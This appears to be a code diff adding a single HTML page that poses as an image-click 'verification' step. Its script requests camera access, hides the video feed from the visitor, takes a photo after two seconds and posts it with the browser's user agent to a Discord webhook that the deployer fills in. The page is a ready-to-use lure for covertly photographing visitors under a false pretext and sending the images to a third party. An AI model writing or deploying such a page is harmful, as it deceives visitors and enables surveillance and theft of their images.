@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click Photo to Capture</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+            color: #333;
+            text-align: center;
+        }
+        #clickableImage {
+            width: 300px;
+            height: 300px;
+            object-fit: cover;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+        #clickableImage:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+        }
+        #video {
+            display: none; /* Hide the video feed from the user */
+        }
+        #status {
+            margin-top: 20px;
+            font-style: italic;
+            color: #555;
+            max-width: 400px;
+            min-height: 20px; /* Prevents layout shift */
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Click the Image to Verify</h1>
+    <p>Please click on the image below to allow camera access and take a verification photo.</p>
+    
+    <!-- This is the image the user will click -->
+    <img id="clickableImage" src="https://picsum.photos/300/300" alt="Click here to take a photo">
+    
+    <video id="video" width="640" height="480" autoplay></video>
+    <p id="status"></p>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const clickableImage = document.getElementById('clickableImage');
+            const video = document.getElementById('video');
+            const statusMessage = document.getElementById('status');
+
+            // --- IMPORTANT: PASTE YOUR DISCORD WEBHOOK URL HERE ---
+            const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
+            // Check if the webhook URL has been replaced
+            if (discordWebhookUrl === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
+                statusMessage.textContent = 'Error: Discord Webhook URL not configured in the script.';
+                clickableImage.style.opacity = '0.5';
+                clickableImage.style.cursor = 'not-allowed';
+                alert('Please edit the HTML file and replace "YOUR_DISCORD_WEBHOOK_URL_HERE" with your actual Discord Webhook URL.');
+                return;
+            }
+
+            // Add the click listener to the IMAGE instead of a button
+            clickableImage.addEventListener('click', () => {
+                statusMessage.textContent = 'Requesting camera access...';
+                // Request permission and access to the camera
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        // Attach the video stream to the video element
+                        video.srcObject = stream;
+                        video.play();
+
+                        statusMessage.textContent = 'Camera access granted. Taking photo in 2 seconds...';
+                        // Hide the image to prevent multiple clicks
+                        clickableImage.style.display = 'none';
+
+                        // Wait a moment for the video to adjust, then take the photo
+                        setTimeout(() => {
+                            takePhoto(stream);
+                        }, 2000); // 2-second delay
+                    })
+                    .catch(err => {
+                        console.error("Error accessing camera: ", err);
+                        statusMessage.textContent = 'Error: Could not access camera. Please grant permission.';
+                    });
+            });
+
+            function takePhoto(stream) {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Stop the video stream to turn off the camera light
+                stream.getTracks().forEach(track => track.stop());
+                
+                statusMessage.textContent = 'Photo taken! Sending to Discord...';
+
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('file1', blob, 'photo.png');
+                    
+                    formData.append('payload_json', JSON.stringify({
+                        content: `A new user has clicked the image. User Agent: ${navigator.userAgent}`,
+                        username: 'Site Camera Bot'
+                    }));
+
+                    fetch(discordWebhookUrl, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            statusMessage.textContent = 'Photo sent successfully! Thank you.';
+                            console.log('Photo sent to Discord successfully.');
+                        } else {
+                            statusMessage.textContent = 'Error: Failed to send photo to Discord.';
+                            console.error('Error sending to Discord:', response.statusText);
+                        }
+                    })
+                    .catch(error => {
+                        statusMessage.textContent = 'Error: Network issue while sending photo.';
+                        console.error('Fetch Error:', error);
+                    });
+                }, 'image/png');
+            }
+        });
+    </script>
+</body>
+</html>
